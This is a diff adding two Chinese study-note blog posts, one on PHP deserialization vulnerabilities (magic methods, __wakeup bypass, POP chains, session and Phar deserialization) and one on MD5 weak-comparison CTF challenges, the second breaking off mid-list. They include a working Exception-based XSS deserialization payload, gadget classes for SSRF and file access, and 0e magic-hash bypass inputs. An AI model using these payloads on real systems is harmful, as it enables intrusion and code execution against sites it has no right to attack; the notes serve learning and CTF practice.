@@ -546,6 +546,1661 @@ Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有
       </tags>
   </entry>
   <entry>
+    <title>序列化漏洞</title>
+    <url>/2026/06/26/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[一、PHP序列化与反序列化1. 基础概念
+序列化：将变量&#x2F;对象的数据转换为字符串，用于存储、网络传输。
+反序列化：将序列化后的字符串，还原为原本的变量&#x2F;对象。
+核心函数：
+serialize()：将对象&#x2F;变量转为序列化字符串
+unserialize()：将序列化字符串还原为对象&#x2F;变量
+
+
+
+补充概念
+类：一类事物的抽象定义，包含属性（特征）、方法（动作&#x2F;功能）。示例：
+汽车类：属性（颜色、马力），方法（启动、刹车）
+人类：属性（姓名、身高），方法（吃饭、睡觉）
+
+
+对象：类在内存中的实例化产物，是具体的个体。示例：车牌号京Axxxx的汽车、身份证号11010xxxxx的张三。
+主流编程语言（除C语言外）基本都支持面向对象与序列化操作。
+流转示意：对象 → 序列化 → 字节码&#x2F;字符串 → 网络传输&#x2F;存储 → 反序列化 → 还原对象
+
+2. 无类序列化案例案例1 基础字符串序列化&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$KEY = &quot;KFC&quot;;$str = $_GET[&#x27;str&#x27;];if(unserialize($str)===$KEY)&#123;echo &quot;$flag&quot; .&quot;&lt;/br&gt;&quot;;&#125;show_source(__FILE__);?&gt;
+
+解题操作使用PHP在线工具执行序列化代码：
+&lt;?phpecho serialize(&#x27;KFC&#x27;);?&gt;
+
+输出结果：s:3:&quot;KFC&quot;;
+格式说明：s代表字符串，6代表字符串字符长度。
+构造 payload：?str=s:3:&quot;KFC&quot;;
+案例2 CTF Cookie序列化题目页面代码：
+...&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123;show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123;echo &quot;$flag&quot;;&#125;else&#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;&lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;&lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot; /&gt;&lt;/p&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;?php&#125;$KEY = &#x27;ISecer:www.isecer.com&#x27;;?&gt;
+
+错误思路直接序列化ISecer:www.isecer.com，得到s:21:&quot;ISecer:www.isecer.com&quot;;，设置Cookie访问，结果无效。原因：$KEY变量在判断逻辑之后赋值，判断执行时$KEY为空字符串。
+正确解法序列化空字符串：
+&lt;?phpecho serialize(&quot;&quot;);?&gt;
+
+输出：s:0:&quot;&quot;;构造请求包，设置Cookie: ISecer=s:0:&quot;&quot;;
+3. 类与对象序列化（1）对象序列化&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$p = new Person();$obj = serialize($p);print_r($obj);?&gt;
+
+运行结果：O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;}格式说明：O代表对象，6为类名字符长度，2为对象属性个数。
+（2）对象反序列化&lt;?php$obj = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;;print_r(unserialize($obj));?&gt;
+
+（3）修改属性后反序列化简单来说，”修改属性后反序列化”指的是：在将一个对象反序列化（还原成程序中的对象）之前，人为地修改了代表该对象的”序列化字符串”的内容。
+&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$clz = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:25;&#125;&#x27;;$per = unserialize($clz);print_r($clz);echo &quot;&lt;br&gt;&quot;;echo $per-&gt;name;?&gt;
+
+4. 不同访问修饰符的序列化格式
+public（公共）：本类、子类、外部均可访问，序列化直接显示属性名。
+protected（受保护）：仅本类、子类可访问，序列化格式：\x00*\x00属性名（\x00为空字节）。
+private（私有）：仅本类内部可访问，序列化格式：\x00类名\x00属性名。
+
+示例：
+&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;protected $hobby = &#x27;eat&#x27;;private $age = 18;&#125;$p = new Person();$obj = serialize($p);echo &quot;&lt;br&gt;&quot;;print_r($obj);?&gt;
+
+输出结果：O:6:&quot;Person&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:8:&quot;*hobby&quot;;s:3:&quot;eat&quot;;s:11:&quot;Personage&quot;;i:18;}
+5. __wakeup 绕过
+原理： 某些 PHP 版本中，如果序列化字符串表示的对象属性个数，大于实际定义的属性个数，PHP 会跳过 __wakeup() 方法。
+动作： 将 O:6:&quot;Person&quot;:1:{...} 中的 1 改为 2 或更大。
+用途： 绕过 __wakeup 中可能存在的安全检测。
+
+
+二、PHP魔术方法魔术方法：PHP在特定场景下自动调用的内置方法，序列化漏洞核心利用点。
+
+注：测试 PHP，为直观显示输出结果，我将”\n”纯文本换行符换成了 ““ HTML换行标签，方便直观分行。但部署到 Apache、Nginx 等 Web 服务器、浏览器访问时需改用&lt;br&gt;，因为浏览器会把 PHP 输出内容当作 HTML 解析，文本换行\n只会显示成空格，只有&lt;br&gt;才能实现页面换行效果。
+
+1. __construct 与 __destruct
+__construct()：构造方法，对象创建时自动调用。
+__destruct()：析构方法，对象销毁时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;&lt;br&gt;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);echo &quot;&lt;br&gt;&quot;;?&gt;
+
+流程推演：
+
+new 一个对象会触发 __construct 并 echo ‘调用 construct’
+执行序列化任务
+整个 PHP 脚本运行结束（或变量被手动 unset）时，系统开始清理内存并销毁对象，此时会触发 __destruct，并 echo ‘调用 destruct’。
+
+2. __sleep 与 __wakeup
+__sleep()：对象序列化时自动调用。
+__wakeup()：对象反序列化时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __sleep()&#123;echo &quot;调用&quot;.&quot;__sleep&quot;;echo &quot;&lt;br&gt;&quot;;return array(&quot;name&quot;);&#125;function __wakeup()&#123;echo &quot;调用&quot;.&quot;__wakeup&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;echo &quot;&lt;br&gt;&quot;;$c=unserialize($b);var_dump($c);?&gt;
+
+流程推演：
+
+new 一个对象 $a，触发 __construct。
+调用 serialize($a)，在转换为字符串之前，触发 __sleep。
+echo 打印序列化结果。
+调用 unserialize()，系统根据字符串在内存中生成了一个全新的对象，并触发 __wakeup。
+var_dump 打印反序列化结果。
+当程序彻底结束运行时，系统开始清空内存。因为此时内存中同时存活住了两个对象（一开始 new 出来的 $a，和后来 unserialize 捏造出来的新对象），连续触发了两次 __destruct。
+
+注意：
+反序列化的入口必须是字符串，绝对不能是对象本身。unserialize()这个函数的功能是”把字符串变回对象”。因此，它只能接收字符串作为参数。也不可以直接用 echo 打印对象。
+因此代码不可以写成：
+$a= new Person();echo serialize($a);$b = $a; 			//给 $b 赋值一串字符串：$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;$c = unserialize($b);echo &quot;$c&quot;;		//var_dump($c); 或者用 print_r($c);
+
+3. __get 与 __set
+__get()：访问不存在&#x2F;私有属性时自动调用。
+__set()：赋值给不存在&#x2F;私有属性时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;private $str = &#x27;hello&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __get($b) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__get&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;function __set($name,$value) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__set&quot;;echo &quot;&lt;br&gt;&quot;;$this-&gt;str = $value;&#125;&#125;$a= new Person();echo $a-&gt;age;$a-&gt;age=13;echo $a-&gt;str;?&gt;
+
+流程推演：
+
+new 一个对象 $a，触发 __construct 执行。输出 调用 __construct()。
+读拦截 (__get)：执行 echo $a-&gt;age;。因为 age 这个属性在类里不可访问，系统立刻拦截，触发了 __get 方法。
+__get 内部先输出了 调用 __get。
+然后它执行了 return $this-&gt;str;初始值应该是 &#39;hello&#39;。
+
+
+echo 拿到返回值，打印出了 hello。
+写拦截 (__set)： 执行 $a-&gt;age = 13;给一个不存在的属性 age 强行赋值。系统再次拦截，触发了 __set 方法。
+__set 内部先输出了 调用 __set。
+接着执行 $this-&gt;str = $value;传进来的 13赋值给了内部的 $str 属性。
+
+
+再次读拦截： 执行 echo $a-&gt;str;
+系统再次触发 __get，输出 调用 __get。
+此时返回 $this-&gt;str，因为上一步它已经被改成了 13，所以外部的 echo 最终打印出了 13。
+
+
+脚本执行结束，内存清空销毁对象，自动触发 __destruct，输出 调用 __destruct()。
+
+4. __call 与 __callStatic
+__call()：调用对象中不存在的实例方法时自动调用。
+__callStatic()：调用类中不存在的静态方法时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;public $str = &#x27;hello&#x27;;public static function myStaticMethod() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;myStaticMethod&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __call($b,$q) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__call&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;public static function __callStatic($func, $arguments)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__callStatic&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a-&gt;method();Person::myStaticMethod();Person::method2();?&gt;
+
+流程推演：
+
+创建对象 $a。自动触发 __construct()。输出调用 __construct()
+echo $a-&gt;method();PHP 引擎试图在 $a 这个对象里寻找一个叫 method() 的普通方法。但是并不存在。触发 __call($b, $q)，先输出 调用 __call。接着代码里写了 return $this-&gt;str;，于是把内部属性 &#39;hello&#39; 返回给了外面的 echo，最终在屏幕上打印出了 hello。
+Person::myStaticMethod();，:: 是静态调用的符号。PHP 引擎去 Person 类里找 myStaticMethod()。发现这个静态方法真实存在，且权限是 public。直接执行该方法，输出 调用 myStaticMethod。
+Person::method2();PHP 引擎试图静态调用一个叫 method2() 的方法。发现并不存在。触发__callStatic($func, $arguments)，输出 调用 __callStatic。
+脚本运行结束，内存开始清空自动触发 __destruct()。输出调用 __destruct()。
+
+5. __toString 与 __clone
+__toString()：对象被当作字符串使用&#x2F;输出时自动调用。
+__clone()：使用clone关键字克隆对象时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __toString() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__toString&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;name;&#125;function __clone() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__clone&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a . &#x27;&lt;br&gt;&#x27;;$b = $a;echo $a === $b;$c = clone $a;echo $a === $c;?&gt;
+
+流程推演：
+
+new 一个对象$a，输出调用 __construct()
+echo $a . &#39;&lt;br&gt;&#39;;对象 $a 和一个字符串 &#39;&lt;br&gt;&#39; 拼接在一起打印。为了防止报错，系统强行触发了对象的 __toString() 方法。输出调用 __toString，然后把返回的 $this-&gt;name（也就是 &#39;Jack&#39;）拼接到 &lt;br&gt; 前面输出。
+引用赋值$b = $a;
+echo $a === $b;结果为 true。经过 echo 的强制类型转换。打印出数字 1。
+$c = clone $a;创造了一个新对象 $c，它的属性和 $a 一模一样，但它们在内存中是独立的两个实体。新对象诞生时自动触发 __clone()。输出调用 __clone。
+echo $a === $c;再次比较，虽然长得一样，但已经是两个不同的实体了，所以结果为 false。echo false 在 PHP 中输出空字符串。
+代码执行结束，内存开始清空。两个对象被销毁，连续打印两次 调用 __destruct()。
+
+6. __invoke将对象当作函数直接调用时自动触发。示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __invoke($p1,$p2) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__invoke&quot;;echo &quot;&lt;br&gt;&quot;;return $p1 . &quot;---&quot; . $p2;&#125;&#125;$a= new Person();echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);?&gt;
+
+流程推演：
+
+创建对象 $a，触发 __construct()。调用 __construct()。
+echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);把一个对象（$a）当成了函数来加括号调用。括号里传的两个字符串 &quot;Jack&quot; 和 &quot;is a hacker&quot;传给了 __invoke($p1, $p2)。
+先触发内部的 echo 输出 调用 __invoke。接着执行 return 语句将两个参数拼接。输出Jack---is a hacker。
+程序结束，内存清空，对象销毁，触发 __destruct()。输出调用 __destruct()。
+
+7. __isset 与 __unset
+__isset()：对不可访问属性执行isset()/empty()时自动调用。
+__unset()：对不可访问属性执行unset()销毁时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $sex;private $name;private $age;public function __construct($name = &#x27;&#x27;, $age = 25, $sex = &#x27;男&#x27;)&#123;$this-&gt;name = $name;$this-&gt;age = $age;$this-&gt;sex = $sex;&#125;public function __isset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __isset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;public function __unset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __unset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$person = new Person(&#x27;Jack&#x27;, 18, &#x27;male&#x27;);// __isset()echo isset($person-&gt;sex);echo isset($person-&gt;name);echo isset($person-&gt;age);// __unset()echo &quot;\n&quot;;unset($person-&gt;name);unset($person-&gt;sex);echo isset($person-&gt;sex) ? &#x27;has&#x27; : &#x27;not_has&#x27;, &quot;\n&quot;;?&gt;
+
+流程推演：
+
+new 一个对象，包含公开属性 sex，私有属性 name 和 age。
+echo isset($person-&gt;sex);代码可以直接拿到公开的数据 sex（不触发魔术方法）；但是对于私有数据无法直接接触。因为 sex 是 public，系统直接放行，结果为 true。经过 echo 的强制类型转换，屏幕上打出了数字 1。
+echo isset($person-&gt;name); echo isset($person-&gt;age);当执行 isset 探测 name和age 时，因为权限不够，连续两次被拦截并触发了 __isset 方法，输出了两次提示。
+代码试图用 unset 销毁私有的 name，再次被拦截，触发了 __unset 方法并输出提示。
+当试图销毁公开的 sex 时，因为权限足够，系统没有拦截，而是直接在内存里把它真实删除了。
+最后用三目运算符再次探测 sex 时，发现它已经被删没了，所以输出了 not_has。
+
+
+三、CTF 序列化实战题目示例：CTF-XSS 结合反序列化页面代码 ctf_xss.php
+&lt;?phphighlight_file(__file__);$a = unserialize($_GET[&#x27;k&#x27;]);echo $a;?&gt;
+
+解题思路
+代码调用unserialize反序列化，且直接echo输出对象，触发__toString魔术方法。
+利用PHP原生类（无需自定义）Exception，该类存在__toString方法。
+构造包含XSS语句的Exception对象，序列化后传入参数。
+
+构造代码&lt;?php$e = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($e));?&gt;
+
+将输出字符串作为k参数传入，触发XSS弹窗。
+流程推演：
+
+当服务器执行到 echo $a; 时，强行触发了 Exception 对象的 __toString。
+__toString 强制输出了报错信息，导致原本在 PHP 后端内存对象里的恶意 JS 代码&lt;script&gt;alert(1)&lt;/script&gt;被提取出来，当作一串普通的字符串，拼接到了最终要发送的 HTML 网页源码里。
+服务器把拼凑好的 HTML 源码通过网络发送给了普通用户的浏览器。前端开始逐行解析网页准备渲染画面。当浏览器解析到 &lt;script&gt; 这个标签时，它的 JS 引擎被瞬间激活执行了这句 JavaScript 语句，成功弹出了框框。
+
+补充：查看PHP所有原生魔术方法类&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;$methods = get_class_methods($class);foreach ($methods as $method) &#123;if (in_array($method, array(&#x27;__destruct&#x27;,&#x27;__toString&#x27;,&#x27;__wakeup&#x27;,&#x27;__call&#x27;,&#x27;__callStatic&#x27;,&#x27;__get&#x27;,&#x27;__set&#x27;,&#x27;__isset&#x27;,&#x27;__unset&#x27;,&#x27;__invoke&#x27;,&#x27;__set_state&#x27;))) &#123;print $class . &#x27;::&#x27; . $method . &quot;\n&quot;;&#125;&#125;&#125;?&gt;
+
+Exception::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeupDateTime::__set_stateDateTimeImmutable::__wakeupDateTimeImmutable::__set_stateDateTimeZone::__wakeupDateTimeZone::__set_stateDateInterval::__wakeupDateInterval::__set_stateDatePeriod::__wakeupDatePeriod::__set_stateDOMException::__wakeupDOMException::__toStringJsonException::__wakeupJsonException::__toStringLogicException::__wakeupLogicException::__toStringBadFunctionCallException::__wakeupBadFunctionCallException::__toStringBadMethodCallException::__wakeupBadMethodCallException::__toStringDomainException::__wakeupDomainException::__toStringInvalidArgumentException::__wakeupInvalidArgumentException::__toStringLengthException::__wakeupLengthException::__toStringOutOfRangeException::__wakeupOutOfRangeException::__toStringRuntimeException::__wakeupRuntimeException::__toStringOutOfBoundsException::__wakeupOutOfBoundsException::__toStringOverflowException::__wakeupOverflowException::__toStringRangeException::__wakeupRangeException::__toStringUnderflowException::__wakeupUnderflowException::__toStringUnexpectedValueException::__wakeupUnexpectedValueException::__toStringCachingIterator::__toStringRecursiveCachingIterator::__toStringSplFileInfo::__toStringDirectoryIterator::__toStringFilesystemIterator::__toStringRecursiveDirectoryIterator::__toStringGlobIterator::__toStringSplFileObject::__toStringSplTempFileObject::__toStringSplFixedArray::__wakeupPDOException::__wakeupPDOException::__toStringReflectionException::__wakeupReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionNamedType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionClassConstant::__toStringReflectionExtension::__toStringReflectionZendExtension::__toStringAssertionError::__wakeupAssertionError::__toStringSimpleXMLElement::__toStringSimpleXMLIterator::__toStringPharException::__wakeupPharException::__toStringPhar::__destructPhar::__toStringPharData::__destructPharData::__toStringPharFileInfo::__destructPharFileInfo::__toString
+
+利用：
+XSS &#x2F; 信息泄露： 利用 Exception 或 Error。遇到 echo 时，其 __toString 会将肚子里的报错信息（恶意代码）吐到前端。
+SSRF (内网探针) ： 利用 SoapClient。触发其 __call 方法可强行向内网发送 HTTP 请求。
+文件&#x2F;目录遍历： 利用 DirectoryIterator 或 FilesystemIterator 配合 __toString 读取敏感目录。
+Phar 反序列化： 利用 Phar。无需 unserialize，只需普通文件读取操作（如 file_exists, filesize, file_get_contents, md5_file 等）即可引爆反序列化。
+
+
+四、PHP 反序列化攻击
+核心： 寻找从入口unserialize()到危险函数的”多米诺骨牌”（POP 链）。
+显式入口 (函数类)： 代码直接调用 unserialize()。
+隐式入口 (协议&#x2F;机制类)：
+Phar 协议： 利用 phar:// 伪协议，通过文件操作触发。
+Session 机制： 利用 session.serialize_handler 引擎不一致触发。
+
+
+
+Exception XSS
+触发条件： 存在 unserialize() 入口 &amp;&amp; echo&#x2F;print 输出点。
+动作： 构造 new Exception(&quot;&lt;script&gt;...&quot;)。
+关键点： 触发 Exception::__toString。
+
+Session 反序列化
+触发条件： 存在”存取引擎不一致” (php vs php_serialize)。
+动作：
+寻找写入 Session 的接口，投毒 Payload：| + 序列化字符串。
+触发读取 Session 的页面，触发引擎自动反序列化。
+
+
+关键点： session.auto_start=1 导致的顺序冲突。
+注：若条件竞争不成功，增加上传文件大小（上传超大文件）以延长 Session 文件存活时间，扩大 0.01 秒的窗口期。 增加文件大小 &#x3D; “让子弹多飞一会儿”，增加命中概率。
+
+Phar 反序列化
+触发条件： 代码存在任意文件操作函数 (file_exists, md5_file 等)。
+动作： phar:// + 伪装后缀 (.jpg)。
+关键点： 利用 PHP 底层 phar:// 协议强制反序列化。
+注：Phar 文件必须包含合法签名（如 \x00\x00\xfe\x01）。若手动修改或生成时破坏了签名，PHP 将拒绝识别文件，导致漏洞无法触发。
+
+
+五、总结Q1: PHP 序列化漏洞中，有哪些魔术方法？
+__construct ⭐️构造方法，仅new创建对象时自动触发，反序列化不会执行。
+__destruct ⭐️析构方法，对象销毁、脚本运行结束、反序列化完成后自动触发。
+__toString将对象当作字符串输出、拼接时自动触发。
+__wakeup ⭐️执行反序列化unserialize()时最先触发，存在经典属性数量绕过漏洞。
+__sleep执行序列化serialize()对象前自动触发。
+__call调用不存在或无访问权限的方法时自动触发。
+__get读取不存在、私有&#x2F;受保护不可访问的属性时自动触发。
+__set修改不存在、私有&#x2F;受保护不可访问的属性时自动触发。
+__invoke把对象当作函数（$obj()）调用时自动触发。
+
+Q2: 序列化和反序列化的过程是什么？序列化：把内存中的对象，转换成字符串或字节码，便于存储和网络传输
+反序列化：把字符串或字节码还原为内存中的对象
+Q3: 序列化漏洞的产生原因是什么？用户可以通过 HTTP、或其他网络协议向服务器发送任意的序列化字符串或字节码，服务器未经严格验证就进行了反序列化。
+Q4: 反序列化漏洞的危害有哪些？RCE（远程代码执行），权限提升，敏感信息泄露，DDOS攻击，内网渗透（以该服务器为跳板，攻击公司内网中的其他设备）
+Q5: POP链是什么？攻击者通过控制对象的属性，将程序中现有的多个代码片段（Gadgets）像接龙一样串联起来，最终形成的一条攻击路径。
+Q6: session 反序列化是什么？session 反序列化漏洞是指攻击者通过篡改储存在 session 中的序列化数据，利用服务器解析（还原）这些数据时的逻辑缺陷，从而实现越权访问或远程执行恶意代码的安全漏洞。
+Q7: session 反序列化的形成原因是什么？
+php 使用了不同的 session 序列化引擎处理 session（存入 Session 时使用新引擎 php_serialize（无竖线），读取时使用旧引擎 php（以竖线 | 分割键值）。核心在于读取时，PHP 引擎会对 Session 中的竖线 | 进行切分，并将右侧数据强制反序列化。）
+php 保存 session 的过程是序列化，php 读取 session 的过程是反序列化。
+
+Q8: session 反序列化的危害是什么？RCE（远程代码执行）
+Q9: session 序列化引擎有哪些？PHP、PHP_serialize、PHP_binary
+username=zhangsan的结果是PHP引擎：username | s:8:&quot;zhangsan&quot;;PHP_serialize引擎:a:1:&#123;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;&#125;php_binary引擎:[BS]�usernames:8:&quot;zhangsan&quot;;
+
+Q10: 文件上传进度反序列化是什么？文件上传进度反序列化是指攻击者通过在上传表单中构造恶意的进度标识符，利用 PHP 自动将上传信息存入 session 的机制，结合 session 引擎解析差异，强制服务器在后台还原恶意对象从而触发代码执行。
+Q11: 文件上传进度反序列化的作用是什么？php会话上传进度，phpinfo信息泄露可以看到对应的信息
+
+session.upload_progress.enabled 会话上传进度是否开启
+session.upload_progress.name 会话上传进度名
+session.upload_progress.cleanup 会话上传进度是否会自动清理
+
+当一个文件上传时，PHP 会检查 HTTP 请求。如果发现请求中包含一个特定的变量（默认名称为PHP_SESSION_UPLOAD_PROGRESS），它就会在 $_SESSION 数组中创建一个特殊的键。可用于Session序列化漏洞
+这个键里包含了文件的总大小、当前已上传的大小、预计剩余时间等实时数据。前端可以通过另一个异步请求（AJAX）读取这些 Session 数据，从而绘制出进度条。
+
+本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP特性利用之MD5</title>
+    <url>/2026/06/22/PHP-MD5%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/index/</url>
+    <content><![CDATA[一、[Bugku CTF] MD51. 题目
+
+2. 解题思路
+在题目页面，发现有一个下载文件。
+
+
+
+代码审计，md5。
+
+
+&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;); // 计算固定字符串的MD5，结果是0e83040045199491692543859291139$a = @$_GET[&#x27;a&#x27;];       // 接收GET参数a，@抑制错误$md52 = @md5($a);       // 计算a的MD5，@抑制错误if(isset($a))&#123;          // 检查是否传入参数a    if ($a != &#x27;QNKCDZO&#x27; &amp;&amp;$md51 ==$md52) &#123; // 核心条件：a≠QNKCDZO 且 两者MD5相等        echo &quot;flag**************&quot;; // 满足条件输出flag    &#125; else &#123;        echo &quot;false!!!&quot;;    &#125;&#125; else&#123;    echo &quot;please input a&quot;; // 未传a则提示&#125;?&gt;
+
+PHP MD5弱类型比较漏洞：
+
+md5(&#39;QNKCDZO&#39;) 的结果是 0e83040045199491692543859291139，以0e开头，PHP会将其解析为科学计数法的0；
+
+只要找一个**不等于QNKCDZO**的字符串，其MD5也以0e开头，就能满足 $md51 ==$md52；
+
+也可以用数组绕过（更通用）：md5(数组)返回NULL，但这里优先用经典的0e字符串解法。
+
+访问网页，它让我输入a。
+
+经典0e字符串
+
+
+找MD5以0e开头且不等于QNKCDZO的字符串，常用的有：
+?a=s878926199a?a=240610708
+
+
+拿到flag
+
+
+
+二、[ctf.show] web51. 题目
+2. 解题步骤
+读代码：
+
+&lt;?php$flag=&quot;&quot;;$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];if(isset($v1) &amp;&amp; isset($v2))&#123;    if(!ctype_alpha($v1))&#123;        die(&quot;v1 error&quot;);    &#125;    if(!is_numeric($v2))&#123;        die(&quot;v2 error&quot;);    &#125;    if(md5($v1)==md5($v2)&#123;        echo $flag;    &#125;&#125;?&gt;
+
+
+ctype_alpha($v1)：要求 v1 必须是纯字母字符串。
+is_numeric($v2)：要求 v2 必须是数字或数字字符串。
+$v1 == $v2：使用了 PHP 的弱类型比较 ==，这是本题的突破口。
+
+
+所以要找两个不同的字符串，一个是纯字母，一个是纯数字，它们md5哈希值在弱类型下判定为0。
+
+0e 开头的 MD5 哈希值以及对应的原始明文：
+
+
